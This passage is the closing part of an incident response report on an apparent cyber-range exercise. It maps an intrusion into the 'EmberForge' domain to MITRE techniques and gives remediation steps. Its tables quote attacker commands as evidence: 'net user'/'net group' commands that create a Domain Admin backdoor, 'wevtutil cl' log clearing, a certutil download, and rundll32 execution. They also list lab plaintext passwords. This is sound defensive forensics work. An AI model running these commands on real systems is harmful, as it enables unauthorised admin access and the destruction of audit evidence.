| 23:35 | DC | Shadow copy deleted — evidence destroyed |
| 23:38 | DC | Backdoor account: `net user svc_backup P@ssw0rd123! /add /domain` |
| 23:39 | DC | Privilege escalation: `net group "Domain Admins" svc_backup /add /domain` |
| 23:50 | DC | `wevtutil cl Security` — Security log cleared |
| **23:51** | **DC** | **`wevtutil cl System` — System log cleared ← END OF ATTACK** |

---

## Attacker Infrastructure

| Asset | Value |
|---|---|
| Staging server | `sync.cloud-endpoint.net:8080` |
| C2 domain | `cdn.cloud-endpoint.net` |
| C2 IPs | `104.21.30.237`, `172.67.174.46` (Cloudflare proxied) |
| Exfil destination | `bt5.api.mega.co.nz` / `66.203.125.15` |
| MEGA account | `jwilson.vhr@proton.me` |

---

## Compromised Credentials

> ⚠️ All credentials below must be treated as fully compromised and reset immediately.

| Account | Password | Where Exposed | Privilege |
|---|---|---|---|
| MEGA exfil account | `Summer2024!` | rclone CommandLine_s | External attacker account |
| `svc_backup` | `P@ssw0rd123!` | net user CommandLine_s | Domain Admin |
| `EMBERFORGE\Administrator` | `EmberForge2024!` | net use CommandLine_s | Domain Admin |

---

## Backdoor Accounts — Immediate Action Required

| Account | Privilege | Action Required |
|---|---|---|
| `svc_backup` | Domain Admin | Disable immediately, remove from Domain Admins, delete account |

---

## Credential Theft Techniques Checked

| Technique | Event Code | Result |
|---|---|---|
| LSASS dump (direct syscalls) | EID 11 (file creation) | ✅ Confirmed — `lsass.dmp` |
| VSS ntds.dit theft | EID 1 (vssadmin) | ✅ Confirmed — `nyMdRNSp.tmp` |
| Kerberoasting | EID 4769 | ❌ No evidence |
| AS-REP Roasting | EID 4768 | ❌ No evidence |
| DCSync | EID 4662 | ❌ No evidence |

---

## Exfiltration Channels Checked

| Channel | Method | Result |
|---|---|---|
| MEGA via rclone | EID 3 + EID 1 correlated | ✅ Confirmed exfil channel |
| DNS tunnelling | EID 22 — `QueryName_s` reviewed | ❌ No evidence |
| HTTP POST to external | EID 1 — curl/IWR/wget/ftp in CommandLine_s | ❌ Not found beyond known staging |
| FTP | Included in `has_any` filter | ❌ Not found |

---

## Persistence Mechanisms — Remediation Required

| Mechanism | Location | Action |
|---|---|---|
| Scheduled task | `WindowsUpdate` → `C:\Users\Public\update.exe` | Delete task on workstation |
| Registry key | `HKCU\Software\Classes\ms-settings\shell\open\command` | Remove `(Default)` and `DelegateExecute` values |
| Backdoor account | `svc_backup` in Domain Admins | Disable and delete |
| AnyDesk | `C:\ProgramData\AnyDesk\` | Uninstall and remove config |
| Staged tools | `C:\Users\Public\` on all hosts | Delete `update.exe`, `rclone.exe`, `lsass.dmp`, `gamedev.zip` |
| SMB firewall rule | `SMB` inbound rule on workstation | Remove rule |
| Tools share | `\\10.1.173.145\tools` | Delete share |

---

## MITRE ATT&CK Coverage

| Technique | ID | Evidence |
|---|---|---|
| Spearphishing attachment (ISO) | T1566.001 | `review.dll` delivered via ISO mounted as `D:` |
| Mark of the Web bypass | T1553.005 | ISO container bypasses MOTW tagging |
| Rundll32 execution | T1218.011 | `rundll32.exe D:\review.dll,StartW` |
| Process injection (CreateRemoteThread) | T1055.003 | `rundll32→notepad`, `update→spoolsv` |
| Scheduled task persistence | T1053.005 | `WindowsUpdate` task → `update.exe` |
| fodhelper UAC bypass | T1548.002 | `ms-settings` COM hijack → `DelegateExecute` |
| LSASS memory dump | T1003.001 | Direct syscalls → `lsass.dmp` |
| VSS credential theft | T1003.003 | `ntds.dit` via shadow copy |
| Network share lateral movement | T1021.002 | `tools` share + SMB firewall rule |
| Remote service creation | T1543.003 | Service `MzLblBFm` on server |
| Certutil download (LOTL) | T1105 | `certutil -urlcache -f` |
| Rclone exfiltration | T1048 | `gamedev.zip` → MEGA |
| Domain discovery | T1069.002 | `net user`, `net group`, `nltest` |
| Create domain backdoor account | T1136.002 | `svc_backup` added to Domain Admins |
| Remote access tool (AnyDesk) | T1219 | AnyDesk installed on server |
| Clear Windows event logs | T1070.001 | `wevtutil cl Security/System` |
| Compress collected data (LOTL) | T1560.001 | `Compress-Archive` → `gamedev.zip` |

---

## Recommendations

### Immediate Actions

1. **Isolate all three hosts** from the network
2. **Disable `svc_backup`** and remove from Domain Admins immediately
3. **Reset ALL exposed credentials** — `lmartin`, `Administrator`, `svc_backup`
4. **Remove all persistence mechanisms** listed above
5. **Block attacker infrastructure** at perimeter — `cloud-endpoint.net`, `66.203.125.15`
6. **Notify legal** — `C:\GameDev` contents confirmed exfiltrated to MEGA

### Short-Term Remediation

| Priority | Action | Addresses |
|---|---|---|
| Critical | Reset domain Administrator password | `EmberForge2024!` exposed in logs |
| Critical | Audit all Domain Admin group members | `svc_backup` backdoor pattern |
| Critical | Remove AnyDesk from all hosts | Persistent GUI access channel |
| High | Deploy Sysmon on all hosts if not present | Detection coverage |
| High | Implement MFA on all domain accounts | Credential reuse risk |
| High | Restrict `C:\Users\Public` write access | Staging directory abuse |
| High | Block ISO auto-mount via Group Policy | MOTW bypass technique |
| Medium | Implement LSASS protection (PPL) | Credential dumping |
| Medium | Enable Credential Guard | Pass-the-Hash prevention |
| Medium | Security awareness training for phishing | Initial access vector |

---

## Investigation Statistics

| Metric | Value |
|---|---|
| Total Flags Investigated | 44 |
| Attack Duration | ~2 hours 24 minutes |
| Hosts Compromised | 3 |
| Accounts Compromised | 3 (lmartin, Administrator, svc_backup) |
| Credentials Exposed in Logs | 3 plaintext passwords |
| Data Exfiltrated | C:\GameDev (full directory) |
| Credential Databases Stolen | ntds.dit (all domain hashes), lsass.dmp |
| MITRE Techniques Identified | 17 |
| Persistence Mechanisms | 5 |
| Logs Cleared by Attacker | 2 (Security, System) |

---

## Document Information

| Field | Value |
|---|---|
| Classification | CONFIDENTIAL — Internal Only |
| Case ID | IR-2026-0131-EF |
| Investigation Date | 2026-01-30 |
| Platform | Microsoft Sentinel / law-cyber-range |
| Table | EmberForgeX_CL |
| Status | ✅ Complete — 44/44 Flags |
